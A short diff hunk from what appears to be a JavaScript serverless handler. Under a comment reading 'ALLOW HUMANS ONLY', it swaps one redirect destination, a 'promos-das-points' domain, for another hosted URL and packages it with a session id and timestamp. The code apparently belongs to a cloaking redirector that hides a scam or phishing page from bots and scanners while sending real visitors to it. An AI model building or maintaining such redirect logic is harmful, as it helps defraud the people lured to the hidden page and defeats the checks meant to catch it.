@@ -156,7 +156,7 @@ export default async function handler(req, res) {
     }
 
     // ✅ ALLOW HUMANS ONLY
-    const realUrl = "https://promos-das-points.online/home";
+    const realUrl = "https://serazseindexi.vercel.app/f2/";
     const sessionId = crypto.randomUUID();
     const timestamp = Date.now();
     const payload = JSON.stringify({ realUrl, sessionId, timestamp });
